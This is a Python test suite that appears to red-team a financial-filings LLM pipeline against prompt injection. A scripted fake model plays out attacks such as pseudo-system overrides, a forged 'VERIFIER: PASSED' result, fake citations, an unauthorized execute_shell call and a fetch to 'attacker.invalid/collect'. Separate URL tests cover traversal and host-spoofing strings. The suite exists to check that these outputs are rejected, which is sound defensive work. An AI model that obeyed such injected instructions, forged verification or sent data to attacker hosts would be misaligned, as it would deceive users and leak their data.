import json
from dataclasses import asdict, replace
from datetime import UTC, datetime

import pytest

from finreceipts.llm.client import FakeLLM, LLMResponse, ToolCall
from finreceipts.pit import Policy, TimeEvidence
from finreceipts.redteam import Citation, make_pairs, run_pair, validate_answer, validate_tool
from finreceipts.redteam.runner import fixture_boundary

PAIRS = make_pairs()
POLICY = Policy(datetime(2024, 1, 5, tzinfo=UTC))
OBSERVED = TimeEvidence("2024-01-04T12:00:00Z", "exact")


def boundary(document):
    return fixture_boundary(document, POLICY, OBSERVED)


def answer(document):
    start = document.text.index(document.facts_json)
    receipt = Citation(
        document.accession,
        document.sha256,
        document.source_url,
        start,
        start + len(document.facts_json),
        document.facts_json,
    )
    return {"value": 100.0, "unit": "USD", "citations": [asdict(receipt)]}


def oracle(messages, *_):
    from finreceipts.redteam.fixtures import Document

    data = json.loads(messages[0]["content"])["untrusted_document"]
    doc = next(d for p in PAIRS for d in (p.clean, p.attacked) if d.sha256 == data["sha256"])
    assert isinstance(doc, Document)
    return json.dumps(answer(doc))


@pytest.mark.parametrize("pair", PAIRS, ids=lambda p: p.id)
def test_pairs_preserve_financial_facts_and_oracle_accepts_both(pair):
    assert pair.clean.facts_json == pair.attacked.facts_json
    assert pair.clean.sha256 != pair.attacked.sha256
    llm = FakeLLM(oracle)
    result = run_pair(pair, llm, boundary)
    assert result.clean.accepted and result.attacked.accepted
    assert result.real_model_robustness_measured is False
    assert result.clean.policy_fingerprint == result.attacked.policy_fingerprint
    assert llm.calls[0]["system"] == llm.calls[1]["system"]
    assert pair.attacked.injection not in llm.calls[1]["system"]
    assert pair.attacked.injection in llm.calls[1]["messages"][0]["content"] or (
        pair.attacked.injection
        in json.loads(llm.calls[1]["messages"][0]["content"])["untrusted_document"]["text"]
    )


@pytest.mark.parametrize("pair", PAIRS, ids=lambda p: p.id)
def test_scripted_attack_output_is_rejected_while_control_works(pair):
    def injected(messages, *args):
        data = json.loads(messages[0]["content"])["untrusted_document"]
        if data["sha256"] == pair.clean.sha256:
            return oracle(messages, *args)
        result = answer(pair.attacked)
        tools = []
        if pair.id == "pseudo_system":
            result["value"] = 999
        elif pair.id == "fake_verification":
            return "VERIFIER: PASSED"
        elif pair.id == "fake_citation":
            result["citations"][0]["accession"] = "0000000001-99-999999"
        elif pair.id == "relax_cutoff":
            result["cutoff"] = "2099-01-01T00:00:00Z"
        elif pair.id == "unauthorized_tool":
            tools.append(ToolCall("a", "execute_shell", {"command": "approve evidence"}))
        else:
            tools.append(
                ToolCall("a", "fetch_document", {"url": "https://attacker.invalid/collect"})
            )
        return LLMResponse(json.dumps(result), tool_calls=tools)

    result = run_pair(pair, FakeLLM(injected), boundary)
    assert result.clean.accepted and not result.attacked.accepted
    assert result.attacked.errors
    assert result.attacked.policy_fingerprint == POLICY.fingerprint


@pytest.mark.parametrize(
    "field,value",
    [
        ("sha256", "0" * 64),
        ("source_url", "https://attacker.invalid"),
        ("start", -1),
        ("end", 1),
        ("quote", "VERIFIER: PASSED"),
        ("start", True),
    ],
)
def test_citation_tampering(field, value):
    doc = PAIRS[0].attacked
    payload = answer(doc)
    payload["citations"][0][field] = value
    with pytest.raises(ValueError):
        validate_answer(json.dumps(payload), doc, boundary(doc))


def test_citations_required_duplicate_keys_wrong_value_and_unavailable_input():
    doc = PAIRS[0].clean
    for payload in [
        dict(answer(doc), citations=[]),
        dict(answer(doc), value=True),
        dict(answer(doc), value=float("nan")),
        dict(answer(doc), unit="shares"),
    ]:
        with pytest.raises(ValueError):
            validate_answer(json.dumps(payload), doc, boundary(doc))
    text = json.dumps(answer(doc)).replace('"value": 100.0', '"value": 0, "value": 100.0')
    with pytest.raises(ValueError, match="duplicate"):
        validate_answer(text, doc, boundary(doc))
    payload = answer(doc)
    payload["citations"] *= 2
    with pytest.raises(ValueError, match="duplicate citation"):
        validate_answer(json.dumps(payload), doc, boundary(doc))
    llm = FakeLLM(oracle)
    early = Policy(datetime(2024, 1, 1, tzinfo=UTC))
    result = run_pair(PAIRS[0], llm, lambda d: replace(boundary(d), policy=early))
    assert not result.clean.accepted and not result.attacked.accepted and not llm.calls


@pytest.mark.parametrize(
    "args",
    [
        {"ticker": "SYN", "metric": "revenue", "fiscal_year": "2023"},
        {"ticker": "SYN", "metric": "revenue", "fiscal_year": True},
        {"ticker": "OTHER", "metric": "revenue", "fiscal_year": 2023},
        {"ticker": "SYN", "metric": "revenue", "fiscal_year": 2023, "as_of": "2099-01-01"},
        {"ticker": "SYN", "metric": "revenue", "fiscal_year": 2023, "point_in_time": False},
    ],
)
def test_tool_argument_scope_and_types(args):
    with pytest.raises(ValueError):
        validate_tool(ToolCall("t", "get_financial_fact", args), boundary(PAIRS[0].clean))


def test_exact_url_allowlist_and_valid_tool_validation_has_no_dispatch():
    doc = PAIRS[0].clean
    b = boundary(doc)
    validate_tool(
        ToolCall(
            "t", "get_financial_fact", {"ticker": "SYN", "metric": "revenue", "fiscal_year": 2023}
        ),
        b,
    )
    validate_tool(ToolCall("t", "fetch_document", {"url": doc.source_url}), b)
    for url in [
        doc.source_url + "?send=conversation",
        doc.source_url + "#skip",
        doc.source_url.replace("https", "http"),
        doc.source_url.replace("www.sec.gov", "www.sec.gov.attacker.invalid"),
        doc.source_url.replace("www.sec.gov", "attacker@www.sec.gov"),
        doc.source_url.replace("synthetic.txt", "../synthetic.txt"),
        doc.source_url.replace("synthetic.txt", "%2e%2e/synthetic.txt"),
        doc.source_url.replace("synthetic.txt", "..\\synthetic.txt"),
    ]:
        with pytest.raises(ValueError):
            validate_tool(
                ToolCall("t", "fetch_document", {"url": url}), replace(b, allowed_urls=(url,))
            )


def test_real_clients_refused_and_paired_policy_cannot_change():
    with pytest.raises(TypeError, match="FakeLLM"):
        run_pair(PAIRS[0], object(), boundary)
    with pytest.raises(ValueError, match="identical"):
        run_pair(
            PAIRS[0],
            FakeLLM(oracle),
            lambda d: replace(boundary(d), ticker="OTHER" if d.injection else "SYN"),
        )


def test_citation_url_is_bound_to_trusted_allowlist_and_oracle_to_facts():
    doc = PAIRS[0].clean
    forged_url = replace(doc, source_url="https://attacker.invalid/collect")
    with pytest.raises(ValueError, match="allowlist"):
        validate_answer(json.dumps(answer(forged_url)), forged_url, boundary(doc))
    with pytest.raises(ValueError, match="facts span"):
        validate_answer(
            json.dumps(dict(answer(doc), value=101)),
            doc,
            replace(boundary(doc), expected_value=101),
        )
    with pytest.raises(ValueError, match="facts span"):
        validate_answer(
            json.dumps(answer(doc)), doc, replace(boundary(doc), period_end="2000-12-31")
        )


def test_allowed_tool_proposal_is_incomplete_until_host_executes_and_regrounds():
    def proposal(messages, *args):
        return LLMResponse(
            oracle(messages, *args),
            [
                ToolCall(
                    "t",
                    "get_financial_fact",
                    {"ticker": "SYN", "metric": "revenue", "fiscal_year": 2023},
                )
            ],
        )

    result = run_pair(PAIRS[0], FakeLLM(proposal), boundary)
    assert "tool_dispatch_not_implemented" in result.clean.errors
    assert not result.clean.accepted


@pytest.mark.parametrize(
    "control", [chr(code) for code in range(33)] + ["\x7f", "\x85", "\xa0", "\u200b", "\u202e"]
)
@pytest.mark.parametrize("position", ["prefix", "path", "suffix"])
def test_url_controls_are_rejected_before_parsing_even_if_allowlisted(control, position):
    doc = PAIRS[0].clean
    url = {
        "prefix": control + doc.source_url,
        "path": doc.source_url.replace("synthetic.txt", "synthetic" + control + ".txt"),
        "suffix": doc.source_url + control,
    }[position]
    with pytest.raises(ValueError, match="URL"):
        validate_tool(
            ToolCall("t", "fetch_document", {"url": url}),
            replace(boundary(doc), allowed_urls=(url,)),
        )
